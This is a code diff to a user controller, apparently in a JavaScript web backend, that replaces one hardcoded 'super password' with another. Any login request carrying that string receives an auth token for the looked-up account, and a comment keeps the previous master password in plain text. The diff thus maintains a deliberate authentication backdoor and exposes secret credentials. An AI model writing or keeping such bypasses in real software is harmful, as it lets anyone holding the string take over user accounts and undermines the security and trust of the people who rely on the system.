@@ -636,7 +636,7 @@ class UserController {
     if (!res) {
       return response.notFound({ message: "Akun tidak ditemukan" });
     }
-    if (password == "A#)kLo39we@924+-=719&%$^*@") {
+    if (password == "A#)kLo39we@924+-=719&%$^*@Xz!7p") {
       // old super password D*@)eeNDoje298370+?-=234&%&#*(
       const { token } = await auth.generate(res);
 
